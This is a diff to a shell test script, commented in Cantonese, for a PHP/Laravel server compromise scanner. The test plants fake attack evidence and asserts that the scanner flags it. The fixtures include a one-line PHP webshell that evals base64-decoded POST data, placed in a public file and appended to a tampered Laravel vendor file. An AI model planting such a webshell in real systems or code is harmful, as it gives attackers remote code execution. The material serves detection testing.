@@ -60,6 +60,9 @@ expect "upload_progress 預設 On 會提示"   "$out" "PHP 8.3 FPM：On"
 expect "冇 FPM 可疑子進程"               "$out" "冇發現 PHP-FPM 衍生可疑子進程"
 expect "冇 webshell 特徵"                "$out" "冇發現常見 webshell 特徵"
 expect "冇 UID 0 帳戶"                   "$out" "只有 root 係 UID 0"
+expect "KSMBD 未啟用唔受影響"              "$out" "未有啟用 KSMBD"
+expect "冇解析階段 OOM"                   "$out" "冇發現解析階段 OOM"
+expect_not "乾淨環境冇 POST 批次誤判"       "$out" "POST 批次（≥5 個）"
 expect "輸出結果行"                      "$out" "##RESULT##|"
 
 # ---------- 情況二：佈置攻擊痕跡 ----------
@@ -69,6 +72,29 @@ sed -i 's/^;\?session.upload_progress.enabled.*/session.upload_progress.enabled 
 # 假 webshell + 上傳目錄入面嘅 PHP 檔
 echo '<?php eval(base64_decode($_POST["x"]));' > /home/forge/site/public/shell.php
 echo '<?php' > /home/forge/site/storage/app/public/avatar.php
+# Laravel 12 官方檔（已知誤判）：base64_decode($_SERVER['LARAVEL_INVOKABLE_CLOSURE'])
+# 係合法程式碼，唔應該俾 webshell 特徵誤判；同名檔俾人加多行 eval 就要照樣警告
+for s in site tampered; do
+    mkdir -p "/home/forge/$s/vendor/laravel/framework/src/Illuminate/Concurrency/Console"
+done
+cat > /home/forge/site/vendor/laravel/framework/src/Illuminate/Concurrency/Console/InvokeSerializedClosureCommand.php <<'PHP'
+<?php
+namespace Illuminate\Concurrency\Console;
+class InvokeSerializedClosureCommand {
+    public function handle() {
+        return match (true) {
+            isset($_SERVER['LARAVEL_INVOKABLE_CLOSURE']) => unserialize(
+                base64_decode($_SERVER['LARAVEL_INVOKABLE_CLOSURE'])
+            ),
+            default => null,
+        };
+    }
+}
+PHP
+cp /home/forge/site/vendor/laravel/framework/src/Illuminate/Concurrency/Console/InvokeSerializedClosureCommand.php \
+   /home/forge/tampered/vendor/laravel/framework/src/Illuminate/Concurrency/Console/InvokeSerializedClosureCommand.php
+echo '<?php eval(base64_decode($_POST["x"]));' \
+    >> /home/forge/tampered/vendor/laravel/framework/src/Illuminate/Concurrency/Console/InvokeSerializedClosureCommand.php
 chown -R forge:forge /home/forge
 # 假 access log（大部分來源係 Cloudflare IP，即係 nginx 冇還原真實 IP）
 cat > /var/log/nginx/access.log <<'LOG'
@@ -133,6 +159,14 @@ echo '{ "name": "react-server-dom-webpack", "version": "19.2.8" }' > /home/forge
 # 假 next-server 進程（Ubuntu 24.04 套件嘅 Node.js 18 已 EOL）
 # 用 root 執行：Docker 預設冇 SYS_PTRACE，root 讀唔到其他用戶進程嘅 /proc/<pid>/exe
 node -e 'process.title="next-server (v15.5.20)"; setInterval(()=>{},1000)' >/dev/null 2>&1 &
+# 假 KSMBD 對外服務：container 入面載入唔到真核心模組，用假 ksmbd.mountd 進程
+# + 設定檔 + 445 監聽去模擬「KSMBD 運行緊並對外服務」嘅狀態（情況六會停用佢）
+mkdir -p /etc/ksmbd
+printf '[global]\n[share]\n path = /srv/share\n guest ok = yes\n' > /etc/ksmbd/ksmbd.conf
+cp /bin/bash /tmp/ksmbd.mountd
+/tmp/ksmbd.mountd -c 'sleep 300; :' &
+KSMBD_PID=$!
+node -e 'require("net").createServer(()=>{}).listen(445,"0.0.0.0")' >/dev/null 2>&1 &
 
 sleep 1
 echo "== 情況二：有攻擊痕跡（upload_progress 已設為 Off）=="
@@ -144,6 +178,9 @@ expect "LFI 成功請求"                     "$out" "疑似 LFI／包含 sessio
 expect "POST 到其他 PHP 檔"               "$out" "200 /shell.php"
 expect "session 檔有 upload_progress"    "$out" "包含 upload_progress_ 資料"
 expect "webshell 特徵"                    "$out" "/home/forge/site/public/shell.php"
+expect_not "Laravel 官方檔唔誤判做 webshell" "$out" "/home/forge/site/vendor/laravel/framework/src/Illuminate/Concurrency/Console/InvokeSerializedClosureCommand.php"
+expect "竄改版 Laravel 檔仍會警告"          "$out" "/home/forge/tampered/vendor/laravel/framework/src/Illuminate/Concurrency/Console/InvokeSerializedClosureCommand.php"
+expect "KSMBD 對外服務會警告"               "$out" "KSMBD 運行緊並喺 445 對外監聽"
 expect "上傳目錄有 PHP 檔"                "$out" "storage/app（上傳目錄）入面有 PHP 檔"
 expect "UID 0 後門帳戶"                   "$out" "root 以外嘅 UID 0 帳戶：backdoor"
 expect "運行中 EOL Node.js 為警告"         "$out" "有進程運行中）：已停止官方支援（EOL）"
@@ -197,9 +234,58 @@ echo "== 情況五：FPM 重啟之後 =="
 out5=$(run_scan)
 expect_not "重啟 FPM 之後冇未重啟警告"     "$out5" "已升級但 FPM 未重啟"
 
+# ---------- 情況六：停用 KSMBD，得返用戶空間 Samba 喺 445 ----------
+kill "$KSMBD_PID" 2>/dev/null || true
+wait "$KSMBD_PID" 2>/dev/null || true
+cp /bin/bash /tmp/smbd
+/tmp/smbd -c 'sleep 60; :' &
+sleep 1
+echo "== 情況六：淨係得 Samba（smbd）喺 445 =="
+out6=$(run_scan)
+expect "445 屬 Samba 唔會撈亂 KSMBD"       "$out6" "用戶空間 Samba（smbd）"
+expect_not "停用 KSMBD 之後冇對外警告"     "$out6" "KSMBD 運行緊並喺 445 對外監聽"
+
+# ---------- 情況七：佈置公開 PoC（StealMyBitcoin）利用鏈嘅痕跡 ----------
+# FPM 錯誤 log：兩次解析階段 OOM（Unknown:0）、一次普通應用程式 OOM、一次 worker 段錯誤
+cat >> /var/log/php8.3-fpm.log <<'LOG'
+[21-Oct-2026 10:05:00] WARNING: [pool www] child 123 said into stderr: "PHP message: PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 131072 bytes) in Unknown on line 0"
+[21-Oct-2026 10:05:01] WARNING: [pool www] child 124 said into stderr: "PHP message: PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 131072 bytes) in Unknown on line 0"
+[21-Oct-2026 10:06:00] WARNING: [pool www] child 125 said into stderr: "PHP message: PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in /home/forge/site/public/index.php on line 3"
+[21-Oct-2026 10:05:02] WARNING: [pool www] child 123 exited on signal 11 (SIGSEGV - core dumped) after 1.000000 seconds from start
+LOG
+# Access log：同一秒、同 IP、同路徑 9 個 POST（管線化批次），全部冇 User-Agent
+for _ in 1 2 3 4 5 6 7 8 9; do
+    echo '9.9.9.9 - - [21/Oct/2026:10:05:00 +0000] "POST /php-version.php HTTP/1.1" 200 15 "-" "-"' >> /var/log/nginx/access.log
+done
+# 模擬未修補 PHP：container 嘅 Ubuntu 8.3.6 已 backport 修補（判定為 ok），
+# 移走套件 changelog 等掃瞄判定為未修補，先試到官方臨時緩解未齊嘅提示
+for f in /usr/share/doc/php8.3-*/changelog.Debian.gz; do
+    [ -f "$f" ] && mv "$f" "$f.bak"
+done
+# 異常短嘅 session 檔名 + PoC 工具／證據檔 + expose_php 開啟（memory_limit 用預設 128M）
+echo 'x' > /var/lib/php/sessions/sess_a
+echo '# fake poc' > /home/forge/stealmybitcoin_poc.py
+mkdir -p /home/forge/poc-run-20261026T000000Z
+echo 'expose_php = On' > /etc/php/8.3/fpm/conf.d/99-scan-test.ini
+chown -R forge:forge /home/forge/stealmybitcoin_poc.py /home/forge/poc-run-20261026T000000Z
+
+echo "== 情況七：公開 PoC 利用鏈痕跡 =="
+out7=$(run_scan)
+expect "解析階段 OOM 警告"                 "$out7" "「請求解析階段」記憶體耗盡"
+expect "應用程式 OOM 分開計"                "$out7" "次應用程式碼入面嘅 OOM"
+expect "worker 段錯誤連動警告"              "$out7" "同解析階段 OOM 一齊出現"
+expect "同秒 POST 批次"                     "$out7" "同一秒內、同 IP、同路徑嘅 POST 批次"
+expect "批次全部冇 User-Agent"              "$out7" "（全部冇 User-Agent）"
+expect "session 檔名異常短"                 "$out7" "session 檔名異常短"
+expect "搵到 sess_a"                        "$out7" "/var/lib/php/sessions/sess_a"
+expect "PoC 工具／證據檔"                   "$out7" "發現公開 PoC 工具／執行證據檔"
+expect "memory_limit 緩解未齊"              "$out7" "官方臨時緩解仲差 memory_limit"
+expect "expose_php 提示"                    "$out7" "expose_php = On：回應會帶 X-Powered-By"
+
 echo
 echo "結果：PASS ${PASS}，FAIL ${FAIL}"
 if [ "$FAIL" -gt 0 ]; then
     echo "---- 情況二完整輸出 ----"; echo "$out"
+    echo "---- 情況七完整輸出 ----"; echo "${out7:-（未執行）}"
     exit 1
 fi
